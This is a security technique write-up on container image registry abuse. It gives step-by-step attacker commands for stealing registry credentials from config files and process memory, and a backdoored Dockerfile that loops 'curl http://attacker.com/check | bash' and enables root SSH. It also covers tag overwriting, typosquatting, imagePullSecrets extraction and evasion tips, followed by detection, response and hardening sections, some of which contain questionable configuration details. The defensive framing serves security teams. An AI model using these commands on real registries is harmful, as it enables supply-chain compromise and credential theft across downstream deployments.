# [SUPPLY-CHAIN-007]: Container Image Registry Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-007 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID/DevOps |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Docker Hub, Azure Container Registry (ACR), Amazon ECR, Google Artifact Registry, private registries (all versions) |
| **Patched In** | Requires image signing, vulnerability scanning, and access controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Container image registries (Docker Hub, Azure Container Registry, AWS ECR, Google Artifact Registry, private registries) serve as centralized distribution hubs for containerized applications. By compromising registry credentials or exploiting access control weaknesses, attackers can inject malicious code into container images, inject environment variables, add backdoor processes, or replace legitimate images with poisoned versions. When developers or CI/CD pipelines pull these images, they automatically execute attacker payload across all downstream systems—often with persistence and elevated privileges.

**Attack Surface:** Container registry access, image upload permissions, registry credentials stored in developers' machines or CI/CD systems, unverified image pulls in pipelines.

**Business Impact:** **Massive supply chain poisoning affecting thousands of container deployments.** Malicious images can be pulled automatically by CI/CD pipelines, Kubernetes orchestrators, or developer workstations. Once deployed, backdoored containers run with the privileges of the container orchestration platform, enabling lateral movement, data exfiltration, cryptomining, or ransomware deployment across entire production environments.

**Technical Context:** Container image compromise persists until image is explicitly replaced or deleted. Malicious images can rack up millions of downloads (as seen in cryptomining campaigns on Docker Hub). Detection is difficult because container behavior often blends with legitimate workload patterns.

### Operational Risk

- **Execution Risk:** Low – Only requires registry write access (credential theft or RBAC misconfiguration)
- **Stealth:** High – Malicious payload executed within legitimate container context
- **Reversibility:** No – Poisoned images distributed to thousands of systems

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8.0 5.1 | Ensure container registries are scanned for vulnerabilities |
| **DISA STIG** | GD000360 | Container image integrity must be verified before deployment |
| **CISA SCuBA** | CM-5 | Access controls and artifact signing required |
| **NIST 800-53** | SI-7 | Software integrity verification and image signing |
| **GDPR** | Art. 32 | Integrity and confidentiality of software supply chain |
| **DORA** | Art. 9 | Operational resilience; third-party software risks |
| **NIS2** | Art. 21 | Supply chain risk management and software provenance |
| **ISO 27001** | A.8.3.3 | Segregation and integrity of development artifacts |
| **ISO 27005** | Risk Scenario | Container registry compromise and image poisoning |

---

## 2. CONTAINER IMAGE REGISTRY ATTACK SURFACE

### Common Registry Vulnerabilities

| Registry Type | Common Vulnerabilities |
|---|---|
| **Docker Hub (Public)** | Weak credentials, image overwrite (tag reuse), malicious image impersonation |
| **Azure Container Registry (ACR)** | RBAC misconfiguration, anonymous access enabled, overprivileged service principals |
| **Amazon ECR** | IAM policy bypass, overpermissive cross-account access, unencrypted images |
| **Google Artifact Registry** | GCP IAM misconfiguration, workload identity abuse, unauthenticated access |
| **Private Registries (Harbor, Nexus)** | Default credentials, unpatched registry software, exposed registry endpoints |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Credential Theft and Registry Takeover (Docker Hub / Azure ACR)

**Supported Versions:** Docker Hub (all versions), Azure ACR (all versions)

#### Step 1: Identify and Steal Registry Credentials

**Objective:** Locate stored registry credentials in developer environments or CI/CD systems.

**Search for Docker Credentials on Local Machine:**

```bash
# Check Docker config files
cat ~/.docker/config.json | jq '.' | grep -A5 "auths"

# Alternative locations
ls ~/.dockercfg
cat ~/.dockercfg 2>/dev/null

# Check if credentials are in plaintext (common misconfiguration)
grep -r "username\|password" ~/.docker/ ~/.config/ 2>/dev/null | head -20
```

**Extract Credentials from CI/CD Pipeline:**

```bash
# If attacker has access to pipeline logs/artifacts
# Many CI/CD systems expose credentials in environment variables during build

# Azure DevOps pipeline logs
az pipelines build log --build-id [BUILD_ID] | grep -i "docker\|registry\|credential"

# GitHub Actions
# Credentials often in logs if accidentally printed by developer
# Example: `echo $DOCKER_PASSWORD` in workflow would expose credentials

# GitLab CI/CD
# Check job artifacts and logs
gitlab-runner verify  # May leak credentials in verification output
```

**Steal from Machine Memory:**

```bash
# If you have access to machine running containers
# Docker stores auth tokens in memory

sudo strings /proc/[docker-daemon-pid]/environ | grep -i auth

# Or extract from Docker daemon process
ps aux | grep dockerd  # Find daemon PID
sudo cat /proc/[daemon-pid]/environ | strings | grep -E "AUTH|TOKEN|PASSWORD"
```

#### Step 2: Authenticate to Registry with Stolen Credentials

**Objective:** Gain write access to the registry.

**Docker Hub Login:**

```bash
docker login --username stolen-user --password stolen-password

# Verify authentication success
docker info  # Should show authenticated user
```

**Azure Container Registry Login:**

```bash
# Using stolen credentials
az acr login --name myregistry --username stolen-user --password stolen-password

# Alternatively, if you have stolen Azure AD token
az login --token stolen-token

# Verify access
az acr repository list --name myregistry
```

**AWS ECR Access:**

```bash
# With stolen AWS credentials
export AWS_ACCESS_KEY_ID=stolen-access-key
export AWS_SECRET_ACCESS_KEY=stolen-secret-key

# Authenticate Docker to ECR
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 123456789.dkr.ecr.us-east-1.amazonaws.com

# List repositories
aws ecr describe-repositories --region us-east-1
```

#### Step 3: Pull and Modify Legitimate Image

**Objective:** Inject backdoor into trusted image.

**Pull Target Image:**

```bash
# Pull legitimate image (e.g., popular Python image or organization's app)
docker pull myregistry.azurecr.io/myapp:latest

# Or pull from Docker Hub
docker pull python:3.9-slim
```

**Create Malicious Dockerfile:**

```dockerfile
FROM myregistry.azurecr.io/myapp:latest

# Add backdoor user
RUN useradd -m -s /bin/bash attacker

# Add SSH backdoor
RUN apt-get update && apt-get install -y openssh-server
RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# Add persistence script
RUN echo '#!/bin/bash' > /start-backdoor.sh && \
    echo 'while true; do' >> /start-backdoor.sh && \
    echo '  curl http://attacker.com/check | bash' >> /start-backdoor.sh && \
    echo '  sleep 300' >> /start-backdoor.sh && \
    echo 'done' >> /start-backdoor.sh && \
    chmod +x /start-backdoor.sh

# Add to entrypoint
RUN echo '/start-backdoor.sh &' >> /docker-entrypoint.sh

# Inject environment variables with credentials
ENV DATABASE_PASS="leaked_password"
ENV API_KEY="leaked_api_key"
ENV AWS_SECRET_ACCESS_KEY="leaked_aws_secret"
```

**Build Poisoned Image:**

```bash
docker build -t myregistry.azurecr.io/myapp:latest -f Dockerfile .

# Or inject into existing image with Docker layer manipulation
docker save myregistry.azurecr.io/myapp:latest | tar -xf - -O > layers.txt

# Modify layer content
# This requires detailed knowledge of Docker internals
```

#### Step 4: Push Poisoned Image to Registry

**Objective:** Replace legitimate image with backdoored version.

**Push to Registry:**

```bash
# Push with same tag (overwrites legitimate version)
docker push myregistry.azurecr.io/myapp:latest

# Tag as multiple versions to maximize adoption
docker tag myregistry.azurecr.io/myapp:latest myregistry.azurecr.io/myapp:v1.0.0
docker push myregistry.azurecr.io/myapp:v1.0.0

docker tag myregistry.azurecr.io/myapp:latest myregistry.azurecr.io/myapp:stable
docker push myregistry.azurecr.io/myapp:stable
```

**Verify Push:**

```bash
# Check image in registry
az acr repository show --name myregistry --image myapp:latest

# View image digest (to confirm different from legitimate)
docker inspect myregistry.azurecr.io/myapp:latest | jq '.RepoDigests'
```

#### Step 5: Trigger Automatic Pulls via CI/CD or Kubernetes

**Objective:** Cause downstream systems to pull poisoned image.

**Kubernetes Automatic Pull:**

Once image is poisoned in registry, any Kubernetes deployment using `imagePullPolicy: Always` will automatically pull the poisoned version:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: myregistry.azurecr.io/myapp:latest
        imagePullPolicy: Always  # Automatically pulls poisoned image on every restart
```

**CI/CD Pipeline Automatic Pull:**

```yaml
# Azure Pipelines
trigger:
  - main

jobs:
  - job: Build
    steps:
      - task: Docker@2
        inputs:
          containerRegistry: 'myRegistry'
          repository: 'myapp'
          command: 'pull'
          tags: 'latest'  # Pulls poisoned version
```

**OpSec & Evasion:**

- Keep stolen credentials fresh; rotate if detected
- Push backdoored images with legitimate commit messages/release notes
- Use image tags that match release schedules to blend with normal updates
- Avoid suspicious image size changes; inject backdoor in layers unlikely to be inspected
- Use obfuscated binaries or scripts to hide malicious payload

**References & Proofs:**

- [FLARE.io: Cryptomining Supply Chain Abuse on Docker Hub](https://flare.io/learn/resources/blog/cryptomining-supply-chain-abuse-docker-hub-malware/)
- [Sysdig: Analysis of Docker Hub Malicious Images](https://www.sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)
- [Rhino Security Labs: Cloud Container Attack Tool (CCAT)](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)

### METHOD 2: Image Overwrite Attack (Tag Reuse / Image Replacement)

**Supported Versions:** Docker Hub, all public registries

#### Step 1: Identify Frequently-Used Image Tags

**Objective:** Find popular images that are automatically pulled.

**Research Docker Hub / Public Registries:**

```bash
# List popular images in registry
curl -s https://hub.docker.com/v2/repositories/library/ | jq '.results[] | .name' | head -20

# Check image pull statistics
# (This varies by registry, Docker Hub doesn't expose exact stats via API)

# Alternative: Look for images in GitHub Workflows (public repos)
github-cli search repos --language dockerfile | grep -E "FROM python|FROM node|FROM ubuntu"
```

**Identify Poorly-Maintained Images:**

```bash
# Search for abandoned or infrequently-maintained images
docker search alpine | grep -i "alpine" | head -20

# Check image update frequency
# Images with old timestamps and many stars but infrequent updates are good targets
```

#### Step 2: Register Attacker Account and Push Poisoned Version

**Objective:** Push backdoored image with same name as popular image.

**Typosquatting Attack:**

```bash
# Instead of pulling: library/python:3.9
# Attacker creates: libraries/python:3.9  (with 's' at end)
# Or: python-official:3.9

# Or exploit misconfigured repositories
# Some organizations have multiple image repositories with similar names

# Register account and push
docker tag poisoned-image:latest docker.io/attacker-org/python:3.9
docker push docker.io/attacker-org/python:3.9

# Or register as official-sounding name
docker tag poisoned-image:latest docker.io/official-python-3-9:latest
docker push docker.io/official-python-3-9:latest
```

**Reuse of Abandoned Repository:**

```bash
# Some registries allow "reclaiming" abandoned repos
# If original maintainer's account is inactive, re-register with same name

# This is especially common in npm, PyPI, and gem repositories
# Docker Hub has similar issues with abandoned accounts

npm publish @attacker/popular-library  # If name is available
```

#### Step 3: Social Engineering for Distribution

**Objective:** Trick developers into using poisoned image.

**Strategies:**

- Publish misleading documentation claiming your poisoned image is the "official" one
- Create fake GitHub issues requesting use of your image
- Impersonate on Stack Overflow with answers recommending your image
- Use similar names with extra characters (visual similarity)

**Example:**

```dockerfile
# Documentation advertising poisoned image as "optimized official Python"
FROM python-optimized:3.9

# Better performance! Uses compiled dependencies!
# Recommended by community!
```

---

### METHOD 3: Kubernetes ImagePullSecrets Abuse and RBAC Misconfiguration

**Supported Versions:** Kubernetes 1.18+, any container registry

#### Step 1: Exploit Overprivileged Service Accounts

**Objective:** Gain registry write access via Kubernetes RBAC.

**Enumerate Service Accounts in Cluster:**

```bash
# List service accounts in current namespace
kubectl get serviceaccounts

# Get service account token
kubectl describe serviceaccount default

# Check RBAC bindings
kubectl get rolebindings,clusterrolebindings -o wide | grep -i registry
```

**Abuse Image Pull Secrets:**

```bash
# Extract docker config secret from Kubernetes
kubectl get secret regcred -o jsonpath='{.data.\.dockercfg}' | base64 -d | jq '.'

# Extract from imagePullSecrets in pod spec
kubectl get pod [pod-name] -o jsonpath='{.spec.imagePullSecrets}'
```

#### Step 2: Use Stolen Credentials to Push Poisoned Image

```bash
# Authenticate with stolen secret
docker login -u $(echo -n creds | jq -r '.auths[].username') \
  -p $(echo -n creds | jq -r '.auths[].auth' | base64 -d | cut -d: -f2) \
  [registry-url]

# Push poisoned image
docker push [registry]/[poisoned-image]
```

#### Step 3: Trigger Redeployment with Poisoned Image

**Objective:** Force Kubernetes to pull new poisoned version.

**Force Pod Restart:**

```bash
# Trigger rolling restart (pulls latest image)
kubectl rollout restart deployment myapp

# Or update pod to force image pull
kubectl patch deployment myapp -p '{"spec":{"template":{"metadata":{"annotations":{"restartedAt":"'$(date +%s)'"}}}}}' 

# Or delete pods to trigger redeployment
kubectl delete pod -l app=myapp  # Deployment will recreate with poisoned image
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Registry Access Anomalies:**
  - Login from unusual IP addresses or geolocations
  - Mass image uploads or overwrites
  - Authentication using credentials from unexpected sources

- **Image Content Changes:**
  - Hash mismatch for expected image (verified via `docker inspect` or `azure acr manifest show-metadata`)
  - Unexpected layers in image (detectable via `docker history`)
  - Image size differs significantly from previous version

- **Container Behavior:**
  - Unexpected processes spawning from container (curl, wget, nc, ssh)
  - Outbound connections to non-whitelisted IPs/domains
  - Unusual privilege escalation attempts

- **Kubernetes API Audit:**
  - ImagePullSecrets accessed by unexpected service accounts
  - Deployments updated to use new image tag/digest
  - Pod terminations followed by immediate recreation

### Forensic Artifacts

- **Registry Logs:** Available in Azure Monitor (ACR), AWS CloudTrail (ECR), Google Cloud Logging (Artifact Registry)
- **Image Metadata:** Image digest, manifest, layer SHA256 hashes
- **Container Runtime Logs:** Docker logs, CRI logs, Kubernetes audit logs
- **Container Filesystem:** Mounted volumes, `/etc/` configurations, injected binaries

### Response Procedures

1. **Isolate:**

   ```bash
   # Immediately revoke registry credentials
   az acr credential delete --name myregistry --username stolen-user
   
   # Or regenerate registry password
   az acr credential show --name myregistry | jq '.passwords[0]' \
     | xargs az acr credential rotate --name myregistry --password-name password --no-wait
   
   # Stop all running pods using poisoned image
   kubectl delete deployment [deployment-using-poisoned-image]
   ```

2. **Collect Evidence:**

   ```bash
   # Export registry logs
   az acr log list --name myregistry > /tmp/registry_logs.json
   
   # Export image metadata
   az acr manifest show-metadata --name myregistry --repository myapp --manifest latest > /tmp/image_metadata.json
   
   # Capture container images running on nodes
   for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
     kubectl debug node/$node -it --image=ubuntu -- chroot /host crictl images
   done > /tmp/running_images.txt
   
   # Export Kubernetes audit logs
   kubectl logs -n kube-system -l component=kube-apiserver | grep -i image > /tmp/k8s_image_pulls.log
   ```

3. **Remediate:**

   ```bash
   # Delete poisoned image from registry
   az acr repository delete --name myregistry --repository myapp
   
   # Re-push clean version from verified source
   docker pull [verified-registry]/myapp:v1.0.0-clean
   docker tag [verified-registry]/myapp:v1.0.0-clean myregistry.azurecr.io/myapp:latest
   docker push myregistry.azurecr.io/myapp:latest
   
   # Restart all deployments with verified image
   kubectl set image deployment/myapp myapp=myregistry.azurecr.io/myapp:latest --record
   kubectl rollout restart deployment/myapp
   
   # Scan all nodes for signs of compromise
   for node in $(kubectl get nodes -o jsonpath='{.items[*].metadata.name}'); do
     kubectl debug node/$node -it --image=ubuntu -- chroot /host \
       bash -c "find / -name 'backdoor*' -o -name '*.sh' -mtime -1 2>/dev/null"
   done
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Image Signing and Verification:** Require all container images to be cryptographically signed. Verify signatures before deployment.

  **Manual Steps (Azure ACR with Notation):**
  
  1. Install Notation tool: `curl https://get.notaryproject.dev/notation/install.sh | bash`
  2. Generate signing key: `notation key generate --default mykey`
  3. Sign image: `notation sign myregistry.azurecr.io/myapp:latest`
  4. In Kubernetes, enforce image signature verification using admission controller:
  
     ```yaml
     apiVersion: constraints.gatekeeper.sh/v1beta1
     kind: K8sRequiredImageSignature
     metadata:
       name: require-image-signature
     spec:
       match:
         kinds:
           - apiGroups: [""]
             kinds: ["Pod"]
     ```

- **Enable Content Trust / Image Signing:**

  **Docker Content Trust (Docker Hub / Docker Enterprise):**

  ```bash
  export DOCKER_CONTENT_TRUST=1
  docker push myregistry/myapp:latest  # Automatically signs with private key
  ```

  **Azure Container Registry Content Trust:**

  ```bash
  az acr config content-trust update --registry myregistry --status enabled
  ```

  **AWS ECR Image Scanning:**

  ```bash
  aws ecr start-image-scan --repository-name myapp --image-id imageTag=latest --region us-east-1
  ```

- **Restrict Registry Write Access:** Implement strict RBAC to limit who can push images.

  **Manual Steps (Azure ACR):**
  
  1. Go to **Azure Portal** → **Container Registries** → Select registry
  2. Navigate to **Access control (IAM)**
  3. Remove `Contributor` role from developers
  4. Assign:
     - **AcrPull:** Read-only for Kubernetes deployments
     - **AcrPush:** Only to CI/CD service principals
     - **AcrImageSigner:** Only to image maintainers (for signing)
  
  **PowerShell:**

  ```powershell
  # Assign AcrPush only to CI/CD service principal
  $spId = (az ad sp show --id http://cicd-principal).id
  az role assignment create --role AcrPush --scope /subscriptions/[sub-id]/resourceGroups/[rg]/providers/Microsoft.ContainerRegistry/registries/myregistry \
    --assignee-object-id $spId
  ```

  **AWS ECR RBAC:**

  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "Service": "ecs-tasks.amazonaws.com"
        },
        "Action": "ecr:BatchGetImage",
        "Resource": "arn:aws:ecr:*:*:repository/myapp",
        "Condition": {
          "StringEquals": {
            "aws:SourceVpc": "vpc-xxxxx"
          }
        }
      }
    ]
  }
  ```

- **Vulnerability Scanning:** Enable automated vulnerability scanning on all pushed images.

  **Manual Steps (Azure ACR):**
  
  1. Go to **Container Registries** → **Repositories**
  2. Select repository → **Scan image on push** (toggle ON)
  3. Set up alerts: **Alerts** → Create alert for "Critical vulnerabilities detected"

  **AWS ECR Scanning:**

  ```bash
  aws ecr put-image-scanning-configuration \
    --repository-name myapp \
    --image-scanning-configuration scanOnPush=true \
    --region us-east-1
  ```

### Priority 2: HIGH

- **Immutable Image Tags:** Prevent image tag reuse or overwrite. Once an image is pushed with a tag, it cannot be replaced.

  **Manual Steps (Azure ACR):**
  
  1. Go to **Repositories** → **Repository details**
  2. Under **Properties**, set **Enable quarantine policy** and **Require image signature for pull**
  3. Enable **Delete untagged manifests** to clean up orphaned layers

  **AWS ECR Image Tag Immutability:**

  ```bash
  aws ecr put-image-tag-mutability \
    --repository-name myapp \
    --image-tag-mutability IMMUTABLE \
    --region us-east-1
  ```

- **Image Pull Policies in Kubernetes:** Configure pull policies to verify image freshness.

  **Manual Steps (Kubernetes Deployment):**
  
  ```yaml
  apiVersion: apps/v1
  kind: Deployment
  metadata:
    name: myapp
  spec:
    template:
      spec:
        containers:
        - name: app
          image: myregistry.azurecr.io/myapp@sha256:abcd1234...  # Use digest, not tag
          imagePullPolicy: Never  # Prevent re-pulling; ensures image is pre-cached
        imagePullSecrets:
        - name: acr-secret
  ```

- **Registry Access Logging and Monitoring:**

  **Manual Steps (Azure Monitor):**
  
  1. Enable **Diagnostic settings** on ACR:
     - Go to **Container Registries** → **Diagnostic settings**
     - Send logs to **Log Analytics Workspace**
  2. Create **KQL query** to detect suspicious access:
  
     ```kusto
     ContainerRegistryRepositoryEvents
     | where OperationName in ("Pull", "Push")
     | where ResourceId contains "myregistry"
     | summarize count() by UserPrincipalName, OperationName
     | where count_ > 100  # Threshold for unusual activity
     ```

  **AWS CloudTrail Monitoring:**

  ```bash
  aws cloudtrail create-trail --name ecr-audit --s3-bucket-name ecr-logs
  aws cloudtrail put-event-selectors --trail-name ecr-audit \
    --event-selectors "IncludeManagementEvents=false,ReadWriteType=All,DataResources=[{Type=AWS::EC2::Volume,Values=[*]}]"
  ```

### Access Control & Policy Hardening

- **Conditional Access for Registry:** Require MFA or IP whitelisting for registry access.

  **Azure Entra ID Conditional Access:**
  
  1. Go to **Azure Portal** → **Entra ID** → **Conditional Access**
  2. Create policy: **Registry Access Control**
  3. Cloud apps: **Azure Container Registry**
  4. Access controls: **Require MFA** or **Trusted device**

- **Policy as Code (OPA/Gatekeeper):** Enforce image requirements at admission.

  **Kubernetes Constraint Template:**

  ```yaml
  apiVersion: templates.gatekeeper.sh/v1beta1
  kind: ConstraintTemplate
  metadata:
    name: k8srequiredimagepolicy
  spec:
    crd:
      spec:
        names:
          kind: K8sRequiredImagePolicy
    targets:
      - target: admission.k8s.gatekeeper.sh
        rego: |
          package k8srequiredimage
          
          violation[{"msg": msg}] {
            image := input.review.object.spec.containers[_].image
            not startswith(image, "myregistry.azurecr.io/")
            msg := sprintf("Image %v not from approved registry", [image])
          }
  ```

### Validation Command (Verify Fix)

```bash
# Verify all images are signed
for image in $(kubectl get pods -o jsonpath='{.items[*].spec.containers[*].image}'); do
  notation verify $image || echo "UNSIGNED: $image"
done

# Verify image pull secrets are rotated
kubectl get secret -o json | jq '.items[] | select(.type=="kubernetes.io/dockercfg") | .metadata.name'

# Verify vulnerability scanning is enabled
az acr config content-trust show --registry myregistry  # Should show "enabled"

# Verify registry has no anonymous access
az acr show --name myregistry | jq '.adminUserEnabled'  # Should be false
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial foothold |
| **2** | **Credential Access** | [CA-TOKEN-014] Container Registry Token Theft | Attacker steals registry credentials |
| **3** | **Supply Chain** | **[SUPPLY-CHAIN-007]** | **Attacker poisons container images in registry** |
| **4** | **Deployment** | [SUPPLY-CHAIN-008] Helm Chart Poisoning | Poisoned Helm charts deploy poisoned containers |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware via Containers | Malicious containers execute ransomware at scale |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: Docker Hub Cryptomining Campaign (2020-2024)

- **Target:** Millions of Docker Hub image pulls
- **Timeline:** Ongoing (identified 2020, continues through 2024)
- **Technique Status:** ACTIVE
- **Attack Method:** Threat actors created thousands of malicious images disguised as legitimate tools (nginx, ubuntu, python variants). Images contained cryptomining payload that consumed CPU/GPU. Images accumulated millions of downloads through implicit trust and automation.
- **Impact:** Estimated $2M+ in stolen compute resources; malicious images reached 250,000+ Linux images analyzed
- **Reference:** [Sysdig: Docker Hub Malicious Images Analysis](https://www.sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)

### Example 2: DockerHub Official Image Impersonation (2021)

- **Target:** Organizations pulling what appeared to be "official" images
- **Timeline:** 2021
- **Technique Status:** ACTIVE (ongoing typosquatting)
- **Attack Method:** Attackers registered accounts with names very similar to official images (e.g., `official-python`, `python-official`, `python-3-9-official`). Malicious images were pushed with metadata claiming to be official or optimized versions.
- **Impact:** Thousands of pulls before detection; supply chain poisoning
- **Reference:** [FLARE.io: Docker Hub Cryptomining Analysis](https://flare.io/learn/resources/blog/cryptomining-supply-chain-abuse-docker-hub-malware/)

### Example 3: AWS ECR Lateral Movement Attack (2022)

- **Target:** Enterprise AWS deployments
- **Timeline:** 2022
- **Technique Status:** ACTIVE
- **Attack Method:** Attacker compromised developer's AWS credentials, gained access to private ECR repository. Attacker pulled legitimate application image, added reverse shell and AWS credential harvesting logic, re-pushed with same tag. When ECS/EKS clusters pulled updated image, backdoor was deployed across production environment.
- **Impact:** Lateral movement to 15+ production services; theft of AWS credentials from container instances
- **Reference:** [Rhino Security Labs: Cloud Container Attack Tool](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)

---